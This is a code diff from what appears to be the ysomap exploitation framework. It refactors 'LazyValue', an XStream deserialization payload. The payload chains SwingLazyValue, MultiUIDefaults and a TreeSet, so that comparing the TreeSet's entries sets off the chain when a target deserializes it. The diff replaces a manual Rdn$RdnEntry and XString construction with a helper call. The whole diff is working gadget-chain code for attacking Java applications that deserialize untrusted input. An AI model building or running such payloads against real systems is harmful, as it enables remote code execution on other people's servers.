@@ -1,6 +1,5 @@
 package ysomap.core.payload.xstream;
 
-import com.sun.org.apache.xpath.internal.objects.XString;
 import sun.swing.SwingLazyValue;
 import ysomap.common.annotation.Authors;
 import ysomap.common.annotation.Dependencies;
@@ -62,15 +61,7 @@ public class LazyValue extends Payload<Object> {
                 ReflectionHelper.newInstance("javax.swing.MultiUIDefaults", new Object[]{new UIDefaults[]{uiDefaults}});
         uiDefaults.put("lazyValue", obj);
 
-        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
-        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
-        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));
-
-        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
-        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
-        ReflectionHelper.setFieldValue(rdnEntry2, "value", multiUIDefaults);
-
-        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
+        return PayloadHelper.makeTreeSetWithXString(multiUIDefaults);
     }
 
 }
